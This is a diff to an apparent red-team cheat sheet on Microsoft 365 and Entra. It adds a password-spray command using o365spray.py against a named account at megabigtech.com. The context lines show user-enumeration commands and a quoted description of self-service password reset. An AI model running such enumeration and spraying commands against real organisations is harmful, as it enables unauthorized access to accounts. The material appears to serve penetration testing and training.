@@ -9,6 +9,10 @@ Identify Valid Domain Email Address
 python3 oh365userfinder.py -r emails.txt
 python3 o365enum.py -u email.txt -m office.com
 ```
+### M365 Email Password Spray
+```
+python3 o365spray.py --username ryan.lin@megabigtech.com --passfile passwords.txt --domain megabigtech.com --lockout 1 --spray
+```
 ### Microsoft Entra Self-Service Password Reset (SSPR)
 >Microsoft Entra self-service password reset (SSPR) gives users the ability to change or reset their password, with no administrator or help desk involvement. If a user's account is locked or they forget their password, they can follow prompts to unblock themselves and get back to work.
 
